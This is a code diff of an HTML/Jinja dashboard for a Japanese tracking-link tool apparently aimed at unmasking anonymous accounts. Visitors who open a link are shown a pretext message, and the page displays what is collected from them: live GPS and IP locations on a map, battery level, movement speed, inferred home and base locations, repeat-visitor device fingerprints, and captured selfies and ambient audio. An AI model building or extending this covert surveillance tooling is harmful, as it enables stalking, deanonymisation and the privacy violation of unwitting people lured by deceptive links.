@@ -1,137 +1,255 @@
-{% extends "base.html" %}{% block content %}
-<h1>{{ link.person or link.name }}
-  {% if link.mode == "live" %}<span class="badge">リアルタイム</span>{% else %}<span class="badge">一瞬</span>{% endif %}
-  {% if live %}<span class="badge">ライブ中</span>{% endif %}
+<!doctype html>
+<html lang="ja"><head><meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>{{ link.person or link.name }} — 監視室</title>
+<link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css">
+<style>
+body{margin:0;background:#0f1115;color:#e6e9ef;font-family:system-ui,-apple-system,"Hiragino Sans",sans-serif}
+.wrap{max-width:1040px;margin:0 auto;padding:14px}
+h1{font-size:18px;margin:0 0 4px}
+h1 small{color:#8b93a7;font-size:13px;font-weight:400}
+h3{font-size:13px;margin:18px 0 6px;color:#c7cddb}
+.sub{color:#8b93a7;font-size:11.5px;margin:0 0 12px}
+.nav{display:flex;flex-wrap:wrap;gap:7px;margin:0 0 12px}
+.nav a,.nav button{display:inline-block;padding:7px 13px;border-radius:8px;background:#2b3346;
+  color:#c7cddb;text-decoration:none;font-size:12px;border:0;cursor:pointer;font-family:inherit}
+.nav a.p,.nav button.p{background:#4c8dff;color:#fff}
+.nav a.back{background:#3a2b46;color:#e0c7ff}
+#ipwarn{display:none;margin:10px 0;padding:9px 12px;border-radius:10px;
+  background:#2a2113;color:#f0b429;font-size:12px;line-height:1.6}
+.grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(150px,1fr));gap:9px;margin:12px 0}
+.card{background:#171a21;border-radius:10px;padding:11px}
+.k{font-size:11px;color:#8b93a7}
+.v{font-size:18px;font-weight:700;margin-top:2px}
+#map{height:400px;border-radius:12px;overflow:hidden}
+.caps{display:flex;flex-wrap:wrap;gap:8px}
+.caps figure{margin:0;background:#171a21;border-radius:10px;padding:6px;width:132px}
+.caps img,.caps audio{width:120px;display:block}
+.caps figcaption{font-size:10px;color:#8b93a7;margin-top:4px}
+table{width:100%;border-collapse:collapse;font-size:12px;margin-top:6px}
+td,th{border-bottom:1px solid #232734;padding:4px;text-align:left}
+th{color:#8b93a7;font-weight:500;white-space:nowrap}
+a{color:#4c8dff}
+.badge{display:inline-block;font-size:10.5px;padding:2px 7px;border-radius:5px;
+  background:#232734;color:#8b93a7;margin-left:6px;vertical-align:middle}
+.badge.on{background:#12301c;color:#7ee08a}
+.badge.gps{background:#12243a;color:#7fb3ff}
+.badge.ip{background:#2a2113;color:#f0b429}
+.box{background:#171a21;border:1px solid #232734;border-radius:12px;padding:14px;margin-top:12px}
+label{display:block;font-size:12px;color:#c7cddb;margin:10px 0 4px}
+input[type=text],input[type=number],select,textarea{width:100%;box-sizing:border-box;
+  background:#0f1115;border:1px solid #2b3346;border-radius:8px;color:#e6e9ef;padding:8px 10px;font-size:13px}
+textarea{min-height:80px;resize:vertical;line-height:1.7}
+button.act{padding:9px 18px;border:0;border-radius:8px;background:#2b3346;color:#e6e9ef;
+  font-size:12.5px;cursor:pointer;font-family:inherit}
+button.act.p{background:#4c8dff;color:#fff}
+button.act.d{background:#3a1b1b;color:#ff9b9b}
+.row2{display:grid;grid-template-columns:1fr 1fr;gap:12px}
+.flex{display:flex;gap:8px;flex-wrap:wrap;align-items:center;margin-top:10px}
+.req{white-space:pre-wrap;font-size:12.5px;color:#c7cddb;background:#171a21;
+  border-radius:10px;padding:11px 13px;line-height:1.8}
+</style></head><body><div class="wrap">
+
+<h1>{{ link.person or link.name }} <small>/{{ link.code }}</small>
+  {% if live %}<span class="badge on">LIVE</span>{% endif %}
+  <span class="badge">{{ link.mode }}</span>
   {% if not link.active %}<span class="badge">停止中</span>{% endif %}
 </h1>
-<p class="mono">{{ base }}/l/{{ link.code }}</p>
+<p class="sub">作成 {{ (link.created_at or '')[:16] }} ／ ヒット {{ link.hit_count }} ／ 取得点 {{ n }}</p>
 
-<div class="card">
-  <div class="row">
-    <a href="{{ base }}/l/{{ link.code }}" target="_blank" rel="noopener"><button type="button">URLを開く</button></a>
-    <a href="/link/{{ link.code }}/qr.png" target="_blank" rel="noopener"><button type="button">QR</button></a>
-    <button type="button" id="copy" data-u="{{ base }}/l/{{ link.code }}">URLをコピー</button>
-    <form method="post" action="/track/{{ link.code }}/clear" style="display:inline">
-      <button>位置履歴を消す</button></form>
-    <form method="post" action="/track/{{ link.code }}/delete" style="display:inline">
-      <button>削除</button></form>
-  </div>
+<div class="nav">
+  <button class="p" id="cp">リンクをコピー</button>
+  <a href="{{ base }}/l/{{ link.code }}" target="_blank">このリンクを開く</a>
+  <a class="back" href="{{ base }}/">裏垢トラッカー</a>
+  <a href="{{ base }}/tracks">追跡一覧</a>
+  <a href="{{ base }}/link/{{ link.code }}">リンク詳細</a>
+  <a href="{{ base }}/link/{{ link.code }}/qr.png" target="_blank">QR</a>
+  <a href="{{ base }}/livetrack">表示設定</a>
 </div>
 
-<div class="card">
-  <div class="grid2">
-    <div><div class="k">状態</div><div class="v" id="s_state">{{ "ライブ中" if live else ("最終 " + (link.last_ts or "-")[:19]) }}</div></div>
-    <div><div class="k">現在地</div><div class="v mono" id="s_now">{{ (link.last_lat|round(5) ~ ", " ~ link.last_lon|round(5)) if link.last_lat else "-" }}</div></div>
-    <div><div class="k">精度</div><div class="v" id="s_acc">{{ (link.last_acc|round(0) ~ " m") if link.last_acc else "-" }}</div></div>
-    <div><div class="k">点数</div><div class="v" id="s_n">{{ n }}</div></div>
-    <div><div class="k">移動距離</div><div class="v" id="s_km">-</div></div>
-    <div><div class="k">セッション</div><div class="v">{{ sessions|length }}</div></div>
-    <div><div class="k">推定市区町村</div><div class="v" id="s_city">{{ link.last_city or "-" }}</div></div>
-    <div><div class="k">電池</div><div class="v" id="s_batt">{{ (link.last_batt|round(2)) if link.last_batt is not none else "-" }}</div></div>
-    <div><div class="k">送信間隔</div><div class="v">{{ link.interval }} 秒</div></div>
-  </div>
-  <label style="margin-top:10px"><input type="checkbox" id="follow" checked> 最新位置に地図を追従する</label>
-</div>
+{% if link.note %}<div class="req">{{ link.note }}</div>{% endif %}
 
-<h2>地図</h2>
-<link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css">
+<div id="ipwarn"></div>
+<div class="grid" id="cards"></div>
 <div id="map"></div>
-<script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
 
-<h2>設定</h2>
-<form method="post" action="/track/{{ link.code }}/update" class="card">
-  <label>人物名 <input name="person" value="{{ link.person or link.name }}"></label>
-  <label>種類
-    <select name="mode">
-      <option value="snap" {{ "selected" if link.mode == "snap" }}>一瞬のタイプ</option>
-      <option value="live" {{ "selected" if link.mode == "live" }}>リアルタイム追跡</option>
-    </select></label>
-  <label>送信間隔（秒） <input name="interval" type="number" value="{{ link.interval }}" min="5" max="600"></label>
-  <label>メモ <input name="note" value="{{ link.note or '' }}"></label>
-  <label>状態
-    <select name="active">
-      <option value="1" {{ "selected" if link.active }}>有効</option>
-      <option value="0" {{ "selected" if not link.active }}>停止</option>
-    </select></label>
-  <button>保存</button>
-</form>
+<h3>取得物（自撮り・環境音）</h3><div class="caps" id="caps"></div>
 
-<h2>軌跡（{{ n }} 点）</h2>
-<table id="plog">
-<tr><th>時刻</th><th>座標</th><th>精度</th><th>種別</th><th>推定地域</th><th>IP</th><th>電池</th></tr>
-{% for p in pts|reverse %}
-<tr>
-  <td>{{ (p.ts or "")[:19] }}</td>
-  <td class="mono">{{ p.lat|round(5) }}, {{ p.lon|round(5) }}</td>
-  <td>{{ p.acc|round(0) if p.acc else "-" }}m</td>
-  <td>{{ "GPS" if p.src == "gps" else "IP" }}</td>
-  <td>{{ p.city or "" }}</td>
-  <td class="mono">{{ p.ip }}</td>
-  <td>{{ p.batt if p.batt is not none else "-" }}</td>
-</tr>
-{% endfor %}
+<h3>拠点推定</h3><div id="spots"></div>
+
+<h3>リピーター</h3><div id="rep"></div>
+
+<h3>セッション（{{ sessions|length }}件）</h3>
+<table>
+  <tr><th>セッション</th><th>開始</th><th>最終</th><th>点</th></tr>
+  {% for s in sessions %}
+  <tr><td>{{ s.sid }}</td><td>{{ (s.first or '')[:19] }}</td>
+      <td>{{ (s.last or '')[:19] }}</td><td>{{ s.n }}</td></tr>
+  {% else %}<tr><td colspan="4" class="k">まだありません</td></tr>{% endfor %}
 </table>
 
+<h3>日別</h3>
+<table>
+  <tr><th>日</th><th>点</th><th>最初</th><th>最後</th></tr>
+  {% for d in days %}
+  <tr><td>{{ d.d }}</td><td>{{ d.n }}</td><td>{{ (d.first or '')[:19] }}</td>
+      <td>{{ (d.last or '')[:19] }}</td></tr>
+  {% else %}<tr><td colspan="4" class="k">まだありません</td></tr>{% endfor %}
+</table>
+
+<h3>設定</h3>
+<div class="box">
+  <form method="post" action="{{ base }}/track/{{ link.code }}/update">
+    <label>名前（要件の見出し）</label>
+    <input type="text" name="person" value="{{ link.person or link.name }}">
+    <label>メモ（来訪者に見せる要件本文）</label>
+    <textarea name="note">{{ link.note or '' }}</textarea>
+    <div class="row2">
+      <div>
+        <label>モード</label>
+        <select name="mode">
+          {% for m in ['snap','live','page','geo','quiz','identify','redirect'] %}
+          <option value="{{ m }}" {% if link.mode == m %}selected{% endif %}>{{ m }}</option>
+          {% endfor %}
+        </select>
+      </div>
+      <div>
+        <label>取得間隔（秒）</label>
+        <input type="number" name="interval" min="5" max="600" value="{{ link.interval or 15 }}">
+      </div>
+    </div>
+    <label>有効 / 停止</label>
+    <select name="active">
+      <option value="1" {% if link.active %}selected{% endif %}>有効</option>
+      <option value="0" {% if not link.active %}selected{% endif %}>停止</option>
+    </select>
+    <div class="flex"><button class="act p" type="submit">保存</button></div>
+  </form>
+
+  <div class="flex">
+    <form method="post" action="{{ base }}/track/{{ link.code }}/clear"
+          onsubmit="return confirm('取得点を全部消しますか？')">
+      <button class="act" type="submit">取得点を消す</button></form>
+    <form method="post" action="{{ base }}/track/{{ link.code }}/delete"
+          onsubmit="return confirm('このリンクを削除しますか？')">
+      <button class="act d" type="submit">リンクを削除</button></form>
+  </div>
+</div>
+
+<script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
 <script>
-const PTS = {{ pts_json|safe }};
-const CODE = {{ link.code|tojson }};
-const MODE = {{ link.mode|tojson }};
-const m = L.map('map').setView([36.2,138.2],5);
+var CODE = {{ link.code|tojson }};
+var BASE = {{ base|tojson }};
+var LINK_URL = BASE + "/l/" + CODE;
+
+(function () {
+  var b = document.getElementById("cp");
+  function done() { b.textContent = "コピーしました";
+    setTimeout(function () { b.textContent = "リンクをコピー"; }, 1600); }
+  function fallback() {
+    try {
+      var t = document.createElement("textarea");
+      t.value = LINK_URL; t.style.cssText = "position:fixed;left:-9999px";
+      document.body.appendChild(t); t.select(); document.execCommand("copy");
+      t.remove(); done();
+    } catch (e) {}
+  }
+  b.addEventListener("click", function () {
+    try {
+      if (navigator.clipboard && navigator.clipboard.writeText) {
+        navigator.clipboard.writeText(LINK_URL).then(done).catch(fallback);
+      } else fallback();
+    } catch (e) { fallback(); }
+  });
+})();
+
+var map = L.map('map').setView([36.2, 138.2], 5);
 L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png',
-  {attribution:'&copy; OpenStreetMap'}).addTo(m);
-const line = L.polyline([], {color:'#4c8dff', weight:4, opacity:.85}).addTo(m);
-const me = L.circleMarker([36.2,138.2], {radius:9, color:'#2ecc71',
-  fillColor:'#2ecc71', fillOpacity:.9}).addTo(m);
-const follow = document.getElementById('follow');
+  {maxZoom:19, attribution:'OSM'}).addTo(map);
+var layer = L.layerGroup().addTo(map), line = null;
+function esc(s){return String(s==null?"":s).replace(/[<>&]/g,function(c){
+  return {'<':'&lt;','>':'&gt;','&':'&amp;'}[c];});}
+function km(v){return (v>=1000? (v/1000).toFixed(1)+"km" : Math.round(v)+"m");}
+function fmt(ms){var s=Math.round((ms||0)/1000);return Math.floor(s/60)+"分"+(s%60)+"秒";}
 
-function hav(a,b){
-  const R=6371000, r=Math.PI/180;
-  const dLat=(b[0]-a[0])*r, dLon=(b[1]-a[1])*r;
-  const s=Math.sin(dLat/2)**2+Math.cos(a[0]*r)*Math.cos(b[0]*r)*Math.sin(dLon/2)**2;
-  return 2*R*Math.asin(Math.sqrt(s));
+function loadSpy(){
+  fetch('/api/spy/'+encodeURIComponent(CODE),{cache:'no-store'})
+   .then(function(r){return r.json()}).then(function(d){
+    document.getElementById('cards').innerHTML =
+      [['移動距離', km(d.moved_m)], ['平均速度', d.avg_kmh+' km/h'],
+       ['推定移動手段', d.transport], ['取得点', d.points],
+       ['GPS以外の点', d.ip_only], ['滞在合計', fmt(d.dwell_ms)]]
+      .map(function(x){return '<div class="card"><div class="k">'+x[0]+
+        '</div><div class="v">'+esc(x[1])+'</div></div>'}).join('');
+    var w = document.getElementById('ipwarn');
+    if (w) { if (d.warn) { w.style.display='block'; w.textContent='⚠ '+d.warn; }
+             else { w.style.display='none'; } }
+    document.getElementById('caps').innerHTML = (d.captures||[]).map(function(x){
+      var url='/s/'+encodeURIComponent(CODE)+'/cap/'+x.id;
+      var body = x.kind==='voice'
+        ? '<audio controls src="'+url+'"></audio>' : '<img src="'+url+'">';
+      return '<figure>'+body+'<figcaption>'+esc(x.kind)+' '+
+        esc((x.ts||'').slice(5,19))+'</figcaption></figure>';
+    }).join('') || '<div class="k">まだなし</div>';
+    document.getElementById('spots').innerHTML =
+      '<table><tr><th>推定</th><th>都市</th><th>点</th><th>基準</th><th>最終</th><th>座標</th></tr>' +
+      ((d.spots||[]).map(function(s){
+        return '<tr><td>'+esc(s.label)+'</td><td>'+esc(s.city)+'</td><td>'+s.n+
+        '</td><td>'+esc(s.acc)+'</td><td>'+esc((s.last||'').slice(5,16))+'</td><td>'+
+        s.lat.toFixed(4)+','+s.lon.toFixed(4)+'</td></tr>';}).join('') ||
+        '<tr><td colspan="6" class="k">点が増えると出ます</td></tr>') + '</table>';
+    document.getElementById('rep').innerHTML =
+      '<table><tr><th>端末/IP</th><th>回数</th><th>端末</th><th>最終</th></tr>' +
+      ((d.repeaters||[]).map(function(r){
+        return '<tr><td>'+esc(r.k)+'</td><td>'+r.n+'</td><td>'+esc(r.device)+
+        '</td><td>'+esc((r.last||'').slice(5,16))+'</td></tr>';}).join('') ||
+        '<tr><td colspan="4" class="k">まだなし</td></tr>') + '</table>';
+  }).catch(function(){});
 }
-let lastId = 0, dist = 0, count = 0;
-function add(p){
-  if (p.lat === null || p.lat === undefined) return;
-  const c = [p.lat, p.lon];
-  const cur = line.getLatLngs();
-  if (count) dist += hav(c, [cur[cur.length-1].lat, cur[cur.length-1].lng]);
-  line.addLatLng(c); me.setLatLng(c); count++;
-  document.getElementById('s_n').textContent = count;
-  document.getElementById('s_km').textContent =
-    dist > 1000 ? (dist/1000).toFixed(2)+' km' : Math.round(dist)+' m';
-  if (follow.checked) m.setView(c, Math.max(m.getZoom(), 15));
-  if (p.id > lastId) lastId = p.id;
-  const tr = document.createElement('tr');
-  tr.innerHTML = '<td>'+(p.ts||'').slice(0,19)+'</td><td class="mono">'+
-    p.lat.toFixed(5)+', '+p.lon.toFixed(5)+'</td><td>'+
-    (p.acc?Math.round(p.acc)+'m':'-')+'</td><td>'+(p.src==='gps'?'GPS':'IP')+
-    '</td><td>'+(p.city||'')+'</td><td class="mono">'+(p.ip||'')+'</td><td>-</td>';
-  const tb = document.getElementById('plog');
-  tb.insertBefore(tr, tb.children[1] || null);
-}
-PTS.forEach(add);
-if (count) m.fitBounds(line.getBounds(), {padding:[30,30]});
-document.getElementById('copy').addEventListener('click', function(){
-  navigator.clipboard.writeText(this.dataset.u);
-  this.textContent = 'コピーしました';
-});
 
-async function poll(){
-  try {
-    const j = await (await fetch('/api/track/'+CODE+'?since='+lastId)).json();
-    (j.points||[]).forEach(add);
-    if (j.last && j.last.ts) {
-      document.getElementById('s_state').textContent =
-        j.live ? 'ライブ中' : '最終 '+String(j.last.ts).slice(0,19);
-      if (j.last.lat !== null) document.getElementById('s_now').textContent =
-        j.last.lat.toFixed(5)+', '+j.last.lon.toFixed(5);
-      document.getElementById('s_acc').textContent =
-        j.last.acc ? Math.round(j.last.acc)+' m' : '-';
-      document.getElementById('s_city').textContent = j.last.city || '-';
+function loadTrack(){
+  fetch('/api/track/'+encodeURIComponent(CODE),{cache:'no-store'})
+   .then(function(r){return r.json()}).then(function(t){
+    var pts = (t.points||[]).filter(function(p){return p.lat!=null});
+    layer.clearLayers();
+    var ll = pts.map(function(p){return [p.lat,p.lon]});
+    if (line) { map.removeLayer(line); line = null; }
+    if (ll.length>1){ line = L.polyline(ll,{color:'#4c8dff'}).addTo(map);
+      map.fitBounds(line.getBounds(),{padding:[24,24]}); }
+    else if (ll.length===1){ map.setView(ll[0],16); }
+    pts.forEach(function(p){
+      L.circleMarker([p.lat,p.lon],{radius:3,color:p.src==='ip'?'#f0b429':'#4c8dff'})
+       .addTo(layer);
+    });
+    if (t.last && t.last.lat!=null){
+      L.marker([t.last.lat,t.last.lon]).addTo(layer)
+       .bindPopup(esc(t.last.city||'')+'<br>'+esc((t.last.ts||'').slice(0,19))+
+                  '<br>'+(t.last.src==='ip'?'IP推定':'GPS'));
     }
-  } catch(e){}
+    var w = document.getElementById('ipwarn');
+    if (w && t.warn && w.style.display==='none') {
+      w.style.display='block'; w.textContent='⚠ '+t.warn;
+    }
+  }).catch(function(){});
 }
-setInterval(poll, MODE === 'live' ? 5000 : 15000);
+
+// 初回はサーバ埋め込みの pts を描いてからポーリング
+(function(){
+  try {
+    var pts = {{ pts_json|safe }};
+    var ll = pts.filter(function(p){return p.lat!=null}).map(function(p){return [p.lat,p.lon]});
+    if (ll.length>1){ line = L.polyline(ll,{color:'#4c8dff'}).addTo(map);
+      map.fitBounds(line.getBounds(),{padding:[24,24]}); }
+    else if (ll.length===1){ map.setView(ll[0],15); }
+    pts.forEach(function(p){
+      if (p.lat==null) return;
+      L.circleMarker([p.lat,p.lon],{radius:3,color:p.src==='ip'?'#f0b429':'#4c8dff'})
+       .addTo(layer);
+    });
+  } catch (e) {}
+})();
+
+loadSpy(); loadTrack();
+setInterval(function(){ loadSpy(); loadTrack(); }, 8000);
 </script>
-{% endblock %}
+</div></body></html>
